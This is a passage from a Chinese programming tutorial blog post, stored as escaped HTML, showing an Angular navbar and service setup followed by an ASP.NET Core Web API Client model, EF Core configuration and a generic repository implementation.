          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;a &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;nav-link&quot;&lt;/span&gt;&lt;span&gt; href&lt;/span&gt;&lt;span&gt;=&quot;#&quot;&lt;/span&gt;&lt;span&gt; routerLink&lt;/span&gt;&lt;span&gt;=&quot;/&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Dashboard &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;li&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;ul&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;ul &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;navbar-nav ml-auto&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;li &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;nav-item&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;a &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;nav-link&quot;&lt;/span&gt;&lt;span&gt; href&lt;/span&gt;&lt;span&gt;=&quot;#&quot;&lt;/span&gt;&lt;span&gt; routerLink&lt;/span&gt;&lt;span&gt;=&quot;/register&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Register &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;li&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;li &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;nav-item&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;a &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;nav-link&quot;&lt;/span&gt;&lt;span&gt; href&lt;/span&gt;&lt;span&gt;=&quot;#&quot;&lt;/span&gt;&lt;span&gt; routerLink&lt;/span&gt;&lt;span&gt;=&quot;/login&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Login &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;li&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;ul&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;nav&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;修改app.component.html:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;app-navbar&amp;gt;&amp;lt;/app-navbar&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;container&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;router-outlet&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;router-outlet&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;运行:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/986268/201710/986268-20171030192320965-1485867070.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;建立一个client.service:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
ng g service services/client
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然后在app.module.ts添加引用:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Services Imports&lt;/span&gt;
import { ClientService } from &quot;./services/client.service&quot;;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;并添加在providers里:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;  providers: [
    ClientService
  ],&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;前端先暂时到这, 现在开始搞后端 web api.&lt;/p&gt;

&lt;p&gt;web api项目源码: &lt;a href=&quot;https://github.com/solenovex/asp.net-core-2.0-web-api-boilerplate&quot; target=&quot;_blank&quot;&gt;https://github.com/solenovex/asp.net-core-2.0-web-api-boilerplate&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;项目列表如图:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/986268/201710/986268-20171031142158621-439319124.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;AspNetIdentityAuthorizationServer是一个单独的authorization server, 这里暂时还没用到, 它的端口是5000, 默认不启动.&lt;/p&gt;
&lt;p&gt;CoreApi.Infrastructure 里面有一些基类和接口, 还放了一个公共的工具类等.&lt;/p&gt;
&lt;p&gt;CoreApi.Models就是 models/entities&lt;/p&gt;
&lt;p&gt;CoreApi.DataContext 里面就是DbContext相关的&lt;/p&gt;
&lt;p&gt;CoreApi.Repositories 里面是Repositories&lt;/p&gt;
&lt;p&gt;CoreApi.Services 里面就是各种services&lt;/p&gt;
&lt;p&gt;CoreApi.ViewModels 里面就是各种ViewModels或者叫Dtos&lt;/p&gt;
&lt;p&gt;CoreApi.Web是web启动项目.&lt;/p&gt;
&lt;p&gt;SharedSettings是横跨authorization server和 web api的一些公共设置.&lt;/p&gt;
&lt;p&gt;上面说的这些都没什么用, 下面开始建立Client的api.&lt;/p&gt;

&lt;p&gt;在CoreApi.Models建立文件夹Angular, 然后建立Client.cs:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;using&lt;/span&gt;&lt;span&gt; CoreApi.Infrastructure.Features.Common;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Microsoft.EntityFrameworkCore;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Microsoft.EntityFrameworkCore.Metadata.Builders;

&lt;/span&gt;&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; CoreApi.Models.Angular
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Client : EntityBase
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;decimal&lt;/span&gt; Balance { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Email { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; FirstName { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; LastName { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Phone { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; ClientConfiguration : EntityBaseConfiguration&amp;lt;Client&amp;gt;&lt;span&gt;
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; ConfigureDerived(EntityTypeBuilder&amp;lt;Client&amp;gt;&lt;span&gt; builder)
        {
            builder.Property(x &lt;/span&gt;=&amp;gt; x.Balance).HasColumnType(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;decimal(18,2)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            builder.Property(x &lt;/span&gt;=&amp;gt; x.Email).IsRequired().HasMaxLength(&lt;span&gt;100&lt;/span&gt;&lt;span&gt;);
            builder.Property(x &lt;/span&gt;=&amp;gt; x.FirstName).IsRequired().HasMaxLength(&lt;span&gt;50&lt;/span&gt;&lt;span&gt;);
            builder.Property(x &lt;/span&gt;=&amp;gt; x.LastName).IsRequired().HasMaxLength(&lt;span&gt;50&lt;/span&gt;&lt;span&gt;);
            builder.Property(x &lt;/span&gt;=&amp;gt; x.Phone).HasMaxLength(&lt;span&gt;50&lt;/span&gt;&lt;span&gt;);
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其中父类EntityBase里面含有一些通用属性,Id, CreateUser, UpdateUser, CreateTime, UpdateTime, LastAction, 这些是我公司做项目必须的, 你们随意.&lt;/p&gt;
&lt;p&gt;下面ClientConfiguration是针对Client的fluent api配置类. 他的父类EntityBaseConfiguration实现了EF的IEntityTypeConfiguration接口, 并在父类里面针对EntityBase那些属性使用fluent api做了限制:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; CoreApi.Infrastructure.Features.Common
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;abstract&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; EntityBaseConfiguration&amp;lt;T&amp;gt; : IEntityTypeConfiguration&amp;lt;T&amp;gt; &lt;span&gt;where&lt;/span&gt;&lt;span&gt; T : EntityBase
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;virtual&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Configure(EntityTypeBuilder&amp;lt;T&amp;gt;&lt;span&gt; builder)
        {
            builder.HasKey(e &lt;/span&gt;=&amp;gt;&lt;span&gt; e.Id);
            builder.Property(x &lt;/span&gt;=&amp;gt;&lt;span&gt; x.CreateTime).IsRequired();
            builder.Property(x &lt;/span&gt;=&amp;gt;&lt;span&gt; x.UpdateTime).IsRequired();
            builder.Property(x &lt;/span&gt;=&amp;gt; x.CreateUser).IsRequired().HasMaxLength(&lt;span&gt;50&lt;/span&gt;&lt;span&gt;);
            builder.Property(x &lt;/span&gt;=&amp;gt; x.UpdateUser).IsRequired().HasMaxLength(&lt;span&gt;50&lt;/span&gt;&lt;span&gt;);
            builder.Property(x &lt;/span&gt;=&amp;gt; x.LastAction).IsRequired().HasMaxLength(&lt;span&gt;50&lt;/span&gt;&lt;span&gt;);

            ConfigureDerived(builder);
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;abstract&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; ConfigureDerived(EntityTypeBuilder&amp;lt;T&amp;gt;&lt;span&gt; b);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;弄完Model和它的配置之后, 就添加到DbContext里面. 打开CoreApi.DataContext的CoreContext, 添加Model和配置:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
        &lt;span&gt;protected&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; OnModelCreating(ModelBuilder modelBuilder)
        {
            &lt;/span&gt;&lt;span&gt;base&lt;/span&gt;&lt;span&gt;.OnModelCreating(modelBuilder);
            modelBuilder.HasDefaultSchema(AppSettings.DefaultSchema);

            modelBuilder.ApplyConfiguration(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; UploadedFileConfiguration());
            &lt;span&gt;modelBuilder.ApplyConfiguration(&lt;/span&gt;&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt;&lt;span&gt; ClientConfiguration());&lt;/span&gt;
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
        &lt;span&gt;public&lt;/span&gt; DbSet&amp;lt;UploadedFile&amp;gt; UploadedFiles { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public DbSet&amp;lt;Client&amp;gt; Clients { get; set; }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;在CoreApi.Repositories里面建立Angular目录, 建立ClientRepository.cs:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; CoreApi.Repositories.Angular
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt; IClientRepository : IEntityBaseRepository&amp;lt;Client&amp;gt;&lt;span&gt; { }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; ClientRepository : EntityBaseRepository&amp;lt;Client&amp;gt;&lt;span&gt;, IClientRepository
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; ClientRepository(IUnitOfWork unitOfWork) : &lt;span&gt;base&lt;/span&gt;&lt;span&gt;(unitOfWork)
        {
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;图省事, 我把repository和它的interface放在一个文件了.&lt;/p&gt;
&lt;p&gt;IEntityBaseRepository&amp;lt;T&amp;gt;定义了一些常用的方法:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;
&lt;pre&gt;
&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; CoreApi.DataContext.Infrastructure
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt; IEntityBaseRepository&amp;lt;T&amp;gt; &lt;span&gt;where&lt;/span&gt; T : &lt;span&gt;class&lt;/span&gt;, IEntityBase, &lt;span&gt;new&lt;/span&gt;&lt;span&gt;()
    {
        IQueryable&lt;/span&gt;&amp;lt;T&amp;gt; All { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;; }
        IQueryable&lt;/span&gt;&amp;lt;T&amp;gt; AllIncluding(&lt;span&gt;params&lt;/span&gt; Expression&amp;lt;Func&amp;lt;T, &lt;span&gt;object&lt;/span&gt;&amp;gt;&amp;gt;&lt;span&gt;[] includeProperties);

        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; Count();
        Task&lt;/span&gt;&amp;lt;&lt;span&gt;int&lt;/span&gt;&amp;gt;&lt;span&gt; CountAsync();
        T GetSingle(&lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; id);
        Task&lt;/span&gt;&amp;lt;T&amp;gt; GetSingleAsync(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; id);
        T GetSingle(Expression&lt;/span&gt;&amp;lt;Func&amp;lt;T, &lt;span&gt;bool&lt;/span&gt;&amp;gt;&amp;gt;&lt;span&gt; predicate);
        Task&lt;/span&gt;&amp;lt;T&amp;gt; GetSingleAsync(Expression&amp;lt;Func&amp;lt;T, &lt;span&gt;bool&lt;/span&gt;&amp;gt;&amp;gt;&lt;span&gt; predicate);
        T GetSingle(Expression&lt;/span&gt;&amp;lt;Func&amp;lt;T, &lt;span&gt;bool&lt;/span&gt;&amp;gt;&amp;gt; predicate, &lt;span&gt;params&lt;/span&gt; Expression&amp;lt;Func&amp;lt;T, &lt;span&gt;object&lt;/span&gt;&amp;gt;&amp;gt;&lt;span&gt;[] includeProperties);
        Task&lt;/span&gt;&amp;lt;T&amp;gt; GetSingleAsync(Expression&amp;lt;Func&amp;lt;T, &lt;span&gt;bool&lt;/span&gt;&amp;gt;&amp;gt; predicate, &lt;span&gt;params&lt;/span&gt; Expression&amp;lt;Func&amp;lt;T, &lt;span&gt;object&lt;/span&gt;&amp;gt;&amp;gt;&lt;span&gt;[] includeProperties);
        IQueryable&lt;/span&gt;&amp;lt;T&amp;gt; FindBy(Expression&amp;lt;Func&amp;lt;T, &lt;span&gt;bool&lt;/span&gt;&amp;gt;&amp;gt;&lt;span&gt; predicate);
        &lt;/span&gt;&lt;span&gt;void&lt;/span&gt;&lt;span&gt; Add(T entity);
        &lt;/span&gt;&lt;span&gt;void&lt;/span&gt;&lt;span&gt; Update(T entity);
        &lt;/span&gt;&lt;span&gt;void&lt;/span&gt;&lt;span&gt; Delete(T entity);
        &lt;/span&gt;&lt;span&gt;void&lt;/span&gt; DeleteWhere(Expression&amp;lt;Func&amp;lt;T, &lt;span&gt;bool&lt;/span&gt;&amp;gt;&amp;gt;&lt;span&gt; predicate);
        &lt;/span&gt;&lt;span&gt;void&lt;/span&gt; AddRange(IEnumerable&amp;lt;T&amp;gt;&lt;span&gt; entities);
        &lt;/span&gt;&lt;span&gt;void&lt;/span&gt; DeleteRange(IEnumerable&amp;lt;T&amp;gt;&lt;span&gt; entities);
        &lt;/span&gt;&lt;span&gt;void&lt;/span&gt;&lt;span&gt; Attach(T entity);
        &lt;/span&gt;&lt;span&gt;void&lt;/span&gt; AttachRange(IEnumerable&amp;lt;T&amp;gt;&lt;span&gt; entities);
        &lt;/span&gt;&lt;span&gt;void&lt;/span&gt;&lt;span&gt; Detach(T entity);
        &lt;/span&gt;&lt;span&gt;void&lt;/span&gt; DetachRange(IEnumerable&amp;lt;T&amp;gt;&lt;span&gt; entities);
        &lt;/span&gt;&lt;span&gt;void&lt;/span&gt;&lt;span&gt; AttachAsModified(T entity);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;EntityBaseRepository&amp;lt;T&amp;gt;是它的实现:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;
&lt;pre&gt;
&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; CoreApi.DataContext.Infrastructure
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; EntityBaseRepository&amp;lt;T&amp;gt; : IEntityBaseRepository&amp;lt;T&amp;gt;
        &lt;span&gt;where&lt;/span&gt; T : &lt;span&gt;class&lt;/span&gt;, IEntityBase, &lt;span&gt;new&lt;/span&gt;&lt;span&gt;()
    {
        &lt;/span&gt;&lt;span&gt;#region&lt;/span&gt; Properties
        &lt;span&gt;protected&lt;/span&gt; CoreContext Context { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;; }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; EntityBaseRepository(IUnitOfWork unitOfWork)
        {
            Context &lt;/span&gt;= unitOfWork &lt;span&gt;as&lt;/span&gt;&lt;span&gt; CoreContext;
        }
        &lt;/span&gt;&lt;span&gt;#endregion&lt;/span&gt;

        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;virtual&lt;/span&gt; IQueryable&amp;lt;T&amp;gt; All =&amp;gt; Context.Set&amp;lt;T&amp;gt;&lt;span&gt;();

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;virtual&lt;/span&gt; IQueryable&amp;lt;T&amp;gt; AllIncluding(&lt;span&gt;params&lt;/span&gt; Expression&amp;lt;Func&amp;lt;T, &lt;span&gt;object&lt;/span&gt;&amp;gt;&amp;gt;&lt;span&gt;[] includeProperties)
        {
            IQueryable&lt;/span&gt;&amp;lt;T&amp;gt; query = Context.Set&amp;lt;T&amp;gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; includeProperty &lt;span&gt;in&lt;/span&gt;&lt;span&gt; includeProperties)
            {
                query &lt;/span&gt;=&lt;span&gt; query.Include(includeProperty);
            }
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; query;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;virtual&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; Count()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Context.Set&amp;lt;T&amp;gt;&lt;span&gt;().Count();
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;&lt;span&gt;int&lt;/span&gt;&amp;gt;&lt;span&gt; CountAsync()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;await&lt;/span&gt; Context.Set&amp;lt;T&amp;gt;&lt;span&gt;().CountAsync();
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; T GetSingle(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; id)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Context.Set&amp;lt;T&amp;gt;().FirstOrDefault(x =&amp;gt; x.Id ==&lt;span&gt; id);
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;T&amp;gt; GetSingleAsync(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; id)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;await&lt;/span&gt; Context.Set&amp;lt;T&amp;gt;().FirstOrDefaultAsync(x =&amp;gt; x.Id ==&lt;span&gt; id);
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; T GetSingle(Expression&amp;lt;Func&amp;lt;T, &lt;span&gt;bool&lt;/span&gt;&amp;gt;&amp;gt;&lt;span&gt; predicate)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Context.Set&amp;lt;T&amp;gt;&lt;span&gt;().FirstOrDefault(predicate);
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;T&amp;gt; GetSingleAsync(Expression&amp;lt;Func&amp;lt;T, &lt;span&gt;bool&lt;/span&gt;&amp;gt;&amp;gt;&lt;span&gt; predicate)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;await&lt;/span&gt; Context.Set&amp;lt;T&amp;gt;&lt;span&gt;().FirstOrDefaultAsync(predicate);
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; T GetSingle(Expression&amp;lt;Func&amp;lt;T, &lt;span&gt;bool&lt;/span&gt;&amp;gt;&amp;gt; predicate, &lt;span&gt;params&lt;/span&gt; Expression&amp;lt;Func&amp;lt;T, &lt;span&gt;object&lt;/span&gt;&amp;gt;&amp;gt;&lt;span&gt;[] includeProperties)
        {
            IQueryable&lt;/span&gt;&amp;lt;T&amp;gt; query = Context.Set&amp;lt;T&amp;gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; includeProperty &lt;span&gt;in&lt;/span&gt;&lt;span&gt; includeProperties)
            {
                query &lt;/span&gt;=&lt;span&gt; query.Include(includeProperty);
            }
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; query.Where(predicate).FirstOrDefault();
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;T&amp;gt; GetSingleAsync(Expression&amp;lt;Func&amp;lt;T, &lt;span&gt;bool&lt;/span&gt;&amp;gt;&amp;gt; predicate, &lt;span&gt;params&lt;/span&gt; Expression&amp;lt;Func&amp;lt;T, &lt;span&gt;object&lt;/span&gt;&amp;gt;&amp;gt;&lt;span&gt;[] includeProperties)
        {
            IQueryable&lt;/span&gt;&amp;lt;T&amp;gt; query = Context.Set&amp;lt;T&amp;gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; includeProperty &lt;span&gt;in&lt;/span&gt;&lt;span&gt; includeProperties)
            {
                query &lt;/span&gt;=&lt;span&gt; query.Include(includeProperty);
            }

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;await&lt;/span&gt;&lt;span&gt; query.Where(predicate).FirstOrDefaultAsync();
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;virtual&lt;/span&gt; IQueryable&amp;lt;T&amp;gt; FindBy(Expression&amp;lt;Func&amp;lt;T, &lt;span&gt;bool&lt;/span&gt;&amp;gt;&amp;gt;&lt;span&gt; predicate)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Context.Set&amp;lt;T&amp;gt;&lt;span&gt;().Where(predicate);
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;virtual&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Add(T entity)
        {
            Context.Set&lt;/span&gt;&amp;lt;T&amp;gt;&lt;span&gt;().Add(entity);
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;virtual&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Update(T entity)
        {
            EntityEntry&lt;/span&gt;&amp;lt;T&amp;gt; dbEntityEntry =&lt;span&gt; Context.Entry(entity);
            dbEntityEntry.State &lt;/span&gt;=&lt;span&gt; EntityState.Modified;

            dbEntityEntry.Property(x &lt;/span&gt;=&amp;gt; x.Id).IsModified = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
            dbEntityEntry.Property(x &lt;/span&gt;=&amp;gt; x.CreateUser).IsModified = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
            dbEntityEntry.Property(x &lt;/span&gt;=&amp;gt; x.CreateTime).IsModified = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;virtual&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Delete(T entity)
        {
            Context.Set&lt;/span&gt;&amp;lt;T&amp;gt;&lt;span&gt;().Remove(entity);
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;virtual&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; AddRange(IEnumerable&amp;lt;T&amp;gt;&lt;span&gt; entities)
        {
            Context.Set&lt;/span&gt;&amp;lt;T&amp;gt;&lt;span&gt;().AddRange(entities);
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;virtual&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; DeleteRange(IEnumerable&amp;lt;T&amp;gt;&lt;span&gt; entities)
        {
            &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; entity &lt;span&gt;in&lt;/span&gt;&lt;span&gt; entities)
            {
                Context.Set&lt;/span&gt;&amp;lt;T&amp;gt;&lt;span&gt;().Remove(entity);
            }
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;virtual&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; DeleteWhere(Expression&amp;lt;Func&amp;lt;T, &lt;span&gt;bool&lt;/span&gt;&amp;gt;&amp;gt;&lt;span&gt; predicate)
        {
            IEnumerable&lt;/span&gt;&amp;lt;T&amp;gt; entities = Context.Set&amp;lt;T&amp;gt;&lt;span&gt;().Where(predicate);

            &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; entity &lt;span&gt;in&lt;/span&gt;&lt;span&gt; entities)
            {
                Context.Entry&lt;/span&gt;&amp;lt;T&amp;gt;(entity).State =&lt;span&gt; EntityState.Deleted;
            }
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Attach(T entity)
        {
